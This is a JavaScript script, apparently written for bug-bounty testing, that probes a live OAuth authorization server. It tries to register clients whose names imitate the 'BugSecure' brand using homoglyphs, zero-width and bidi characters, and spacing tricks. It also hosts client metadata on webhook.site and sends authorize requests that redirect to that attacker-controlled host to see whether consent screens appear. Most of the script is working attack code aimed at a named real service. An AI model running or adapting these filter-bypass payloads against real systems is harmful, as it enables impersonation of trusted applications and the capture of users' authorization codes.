const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (u, o = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2000); } } return null; };
const vis = (s) => s.replace(/[\u200b-\u200f\u00a0\u00ad\ufeff]/g, (m) => "\\u" + m.codePointAt(0).toString(16).padStart(4, "0"));

const VARIANTS = [
  ["BugSecureX", "suffixe X"],
  ["XBugSecure", "prefixe X"],
  [")BugSecure(", "parenthesees"],
  ["BugSecure ", "espace final"],
  [" BugSecure", "espace initial"],
  ["bUGsECURE", "casse melee"],
  ["BUGSECURE", "majuscules"],
  ["Bug Secure", "espace interne"],
  ["Bug-Secure", "trait d union"],
  ["Bug_Secure", "underscore"],
  ["BugSecure.Africa", "point"],
  ["bugsecure.africa", "domaine"],
  ["BugSecur\u0435", "cyrillique e"],
  ["BugS\u00e9cur\u00e9", "accents"],
  ["Bug\u200bSecure", "zero width"],
  ["BugSecure\u00a0Africa", "insécable"],
  ["Bug\u202eSecure", "bidi RLO"],
  ["BugSecure\u202c", "bidi PDF"],
  ["Bug\u00adSecure", "soft hyphen"],
  ["BugSecure\ufeff", "BOM"],
  ["BugSecurit\u00e9", "accent final"],
  ["BugSecure-Africa", "trait d union +"],
  ["Bugsec\u0131re", "turc i"],
  ["Bug\u202cSecure", "bidi initial"],
  ["\u200bBugSecure", "zero width initial"],
  ["BugSecure\u200d", "ZWJ"],
];

console.log("=== A) DCR : le filtre de nom est-il un sous-chaine ou un token ? ===");
const accepted = [];
for (const [name, desc] of VARIANTS) {
  const r = await F(AS + "/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: name, redirect_uris: [BASE + "/cb"] }) });
  const t = r ? await r.text() : "ERR";
  let ok = false, info = "";
  try { const j = JSON.parse(t); ok = !!j.client_id; info = j.client_id || j.error || ""; } catch { ok = /client_id/.test(t); info = t.slice(0, 40); }
  console.log("  " + vis(name).padEnd(24) + "(" + desc.padEnd(18) + ")-> " + (ok ? "ACCEPTE " + info.slice(0, 14) : "refuse (" + info.slice(0, 46) + ")"));
  if (ok) accepted.push(name);
  await sleep(1500);
}
console.log("\n  NOMS ACCEPTES : " + (accepted.length ? JSON.stringify(accepted) : "aucun"));

console.log("\n=== B) CIMD : meme filtre sur le document distant ? (12 variantes) ===");
for (const [name, desc] of VARIANTS.slice(0, 12)) {
  const path = "/nf-" + Date.now() + "-" + Math.random().toString(36).slice(2, 6);
  const doc = { client_id: BASE + path, client_name: name, redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" };
  await F("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: JSON.stringify(doc), default_content_type: "application/json" }) });
  await sleep(800);
  const u = AS + "/oauth/authorize?response_type=code&client_id=" + encodeURIComponent(BASE + path) + "&redirect_uri=" + encodeURIComponent(BASE + "/cb") + "&scope=programs%3Aread&state=bb&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256&resource=" + encodeURIComponent(AS);
  const r = await F(u, { redirect: "manual" });
  const loc = r?.headers.get("location") || "";
  const consent = loc.includes("/oauth/consent");
  const err = (loc.match(/code=([^&]+)/) || [])[1] || "";
  console.log("  " + vis(name).padEnd(24) + "-> " + (consent ? "ACCEPTE (demande de consentement creee)" : "refuse (" + err + ")"));
  await sleep(1500);
}
